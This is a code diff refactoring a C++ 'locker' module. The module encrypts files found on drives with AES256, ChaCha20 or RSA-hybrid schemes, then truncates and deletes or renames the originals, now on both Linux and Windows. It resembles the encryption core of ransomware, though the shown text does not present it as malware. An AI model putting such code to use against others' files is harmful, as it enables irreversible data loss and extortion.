@@ -5,7 +5,9 @@
 #include "global_parameters.h"
 #include "memory.h"
 #include "logs.h"
-
+#ifdef _WIN32
+#include "rsa/rsa.h"
+#endif
 
 #include <stdio.h>
 #include "CommandParser.h"
@@ -118,8 +120,8 @@ bool locker::CryptoSystemInit(CryptoPolicy policy, PCRYPT_INFO crypt_info)
 	{
 		auto algm= (EncryptAlgoMethod)init_hybrid(&mode_);
 		*crypt_info = 
-		{
-			.ctx = (crypto_aes_ctx*)memory::m_malloc(sizeof(crypto_aes_ctx)),
+		CRYPT_INFO{
+			.ctx = (crypto_aes_ctx*)memory::m_malloc(sizeof(crypto_aes_ctx)), 
 			.name = "AES256",
 			.mode = mode_,
 			.method_policy = CryptoPolicy::AES256,
@@ -134,7 +136,7 @@ bool locker::CryptoSystemInit(CryptoPolicy policy, PCRYPT_INFO crypt_info)
 	case CryptoPolicy::CHACHA:
 	{
 		*crypt_info = 
-		{
+		CRYPT_INFO{
 			.name = "ChaCha20",
 			.mode = 0,
 			.method_policy = CryptoPolicy::CHACHA,
@@ -149,7 +151,8 @@ bool locker::CryptoSystemInit(CryptoPolicy policy, PCRYPT_INFO crypt_info)
 	{	
 		auto algm= (EncryptAlgoMethod)init_hybrid(&mode_);
 		*crypt_info = 
-		{
+		CRYPT_INFO{
+			.ctx = NULL,
 			.desc = 
 			{
 				.key_data = (BYTE*)memory::m_malloc(4096),
@@ -181,7 +184,7 @@ bool locker::CryptoSystemInit(CryptoPolicy policy, PCRYPT_INFO crypt_info)
 	{
 		auto algm= (EncryptAlgoMethod)init_hybrid(&mode_);
 		*crypt_info = 
-		{
+		CRYPT_INFO{
 			.desc = 
 			{
 				.key_data = (BYTE*)memory::m_malloc(4096),
@@ -213,7 +216,7 @@ bool locker::CryptoSystemInit(CryptoPolicy policy, PCRYPT_INFO crypt_info)
 	{
 		auto algm= (EncryptAlgoMethod)init_hybrid(&mode_);
 		*crypt_info = 
-		{
+		CRYPT_INFO{
 			.desc = 
 			{
 				.key_data = (BYTE*)memory::m_malloc(4096),
@@ -323,13 +326,14 @@ bool locker::GeneratePolicy(CRYPT_INFO* CryptInfo)
 		LOG_ERROR("[GeneratePolicy] [CryptoSystemInit] Failed");
 		return false;
 	}
-
+#ifdef __linux__
 	if(CommandParser::HASH_FILE)
 	{
 		CryptInfo->hash_data.HashList = new SLIST<HASH_LIST>;
 		CryptInfo->hash_sum_method = (HashSumFunc)filesystem::hash_file;
 		return true;
 	}
+#endif
 	
 	if (CommandParser::signature)
 	{
@@ -431,22 +435,10 @@ bool locker::GeneratePolicy(CRYPT_INFO* CryptInfo)
 	return true;
 }
 
-#ifdef _WIN32
-static bool SecureDelete(CONST TCHAR* FilePath)
-{
-	HANDLE Handle = CreateFileW(FilePath, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
-	if (Handle == INVALID_HANDLE_VALUE)
-		return false;
 
-	if (SetFilePointer(Handle, 0, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER
-		|| !SetEndOfFile(Handle))
-		return false;
-	CloseHandle(Handle);
-	return DeleteFileW(FilePath);
-}
-#else
-static bool SecureDelete(CONST CHAR* FilePath)
+static bool SecureDelete(CONST char* FilePath)
 {
+#ifdef __linux__
 	int desc = api::OpenFile(FilePath);
 	if (desc == -1)
 		return FALSE;
@@ -458,9 +450,19 @@ static bool SecureDelete(CONST CHAR* FilePath)
 	fsync(desc);
 	api::CloseDesc(desc);
 	return unlink(FilePath) == 0;
+#elif _WIN32
+	HANDLE Handle = CreateFileA(FilePath, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+	if (Handle == INVALID_HANDLE_VALUE)
+		return false;
+
+	if (SetFilePointer(Handle, 0, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER
+		|| !SetEndOfFile(Handle))
+		return false;
+	CloseHandle(Handle);
+	return DeleteFileA(FilePath);
+#endif
 }
 
-#endif
 
 
 bool locker::SetOptionFileInfo(PFILE_INFO FileInfo, PDRIVE_INFO data, CRYPT_INFO* CryptInfo)
@@ -493,9 +495,9 @@ bool locker::SetOptionFileInfo(PFILE_INFO FileInfo, PDRIVE_INFO data, CRYPT_INFO
 	else if (CryptInfo->gen_policy == GENKEY_ONCE)
 		FileInfo->ctx = CryptInfo->ctx;
 
-	if (!filesystem::getParseFile(FileInfo) || FileInfo->FileHandle == INVALID_HANDLE_VALUE)
+	if (!api::get_parse_file(data->FullPath, &FileInfo->FileHandle, &FileInfo->Filesize) || FileInfo->FileHandle == INVALID_HANDLE_VALUE)
 	{
-		LOG_ERROR("[SetOptionFileInfo] [ParseFile] Failed; " log_str, data->Filename);
+		LOG_ERROR("[SetOptionFileInfo] [ParseFile] Failed; %s", data->Filename);
 		return false;
 	}
 	
@@ -503,9 +505,9 @@ bool locker::SetOptionFileInfo(PFILE_INFO FileInfo, PDRIVE_INFO data, CRYPT_INFO
 	{
 		FileInfo->newFileHandle = FileInfo->FileHandle;
 	}
-	else if (!filesystem::CreateFileOpen(FileInfo) || FileInfo->newFileHandle == INVALID_HANDLE_VALUE)
+	else if (!api::create_file_open(&FileInfo->newFileHandle, FileInfo->newFilename) || FileInfo->newFileHandle == INVALID_HANDLE_VALUE)
 	{
-		LOG_ERROR("[SetOptionFileInfo] [CreateFileOpen] Failed; " log_str, data->Filename);
+		LOG_ERROR("[SetOptionFileInfo] [CreateFileOpen] Failed; %s", data->Filename);
 		return false;
 	}
 
@@ -523,11 +525,11 @@ void locker::free_file_info(PFILE_INFO FileInfo, bool success)
 	else if (GLOBAL_STATE.g_FlagDelete && !GLOBAL_STATE.g_write_in)
 	{
 		if (!SecureDelete(FileInfo->FilePath))
-			LOG_ERROR("[SecureDelete] Failed; " log_str, FileInfo->Filename);
+			LOG_ERROR("[SecureDelete] Failed; %s", FileInfo->Filename);
 	}
 	else if(GLOBAL_STATE.g_write_in)
 		rename(FileInfo->FilePath, FileInfo->newFilename);
-	
+
 	memory::m_free(FileInfo->newFilename);
 	if (FileInfo->CryptInfo->gen_policy == GENKEY_EVERY_ONCE && FileInfo->ctx) memory::m_free(FileInfo->ctx);
 	memory::memzero_explicit(FileInfo, sizeof(FILE_INFO));
@@ -539,7 +541,7 @@ bool locker::HandlerCrypt
 	PDRIVE_INFO data
 )
 {
-	LOG_INFO("process file; " log_str, data->Filename);
+	LOG_INFO("process file; %s", data->Filename);
 	bool success = false;
 	FILE_INFO FileInfo;
 	if (!(success = SetOptionFileInfo(&FileInfo, data, CryptInfo)))
@@ -549,20 +551,20 @@ bool locker::HandlerCrypt
 		goto END;
 
 	if (!CryptInfo->overwrite_method(CryptInfo, FileInfo.FileHandle, FileInfo.Filesize))
-		LOG_ERROR("[OverWriteFile] Failed; " log_str, data->Filename);
+		LOG_ERROR("[OverWriteFile] Failed; %s", data->Filename);
 
-	if (CommandParser::signature &&
-		CryptInfo->hash_sum_method
-		(
-			CryptInfo,
-			isCrypt ? FileInfo.FileHandle : FileInfo.newFileHandle,
-			isCrypt ? FileInfo.Filename : FileInfo.newFilename
-		));
+	// if (CommandParser::signature &&
+	// 	CryptInfo->hash_sum_method
+	// 	(
+	// 		CryptInfo,
+	// 		isCrypt ? FileInfo.FileHandle : FileInfo.newFileHandle,
+	// 		isCrypt ? FileInfo.Filename : FileInfo.newFilename
+	// 	));
 
 	if(success)
-		LOG_SUCCESS("success encrypt file; " log_str, data->Filename);
+		LOG_SUCCESS("success encrypt file; %s", data->Filename);
 	else
-		LOG_ERROR("failed encrypt file; " log_str, data->Filename);
+		LOG_ERROR("failed encrypt file; %s", data->Filename);
 
 END:
 	free_file_info(&FileInfo, success);
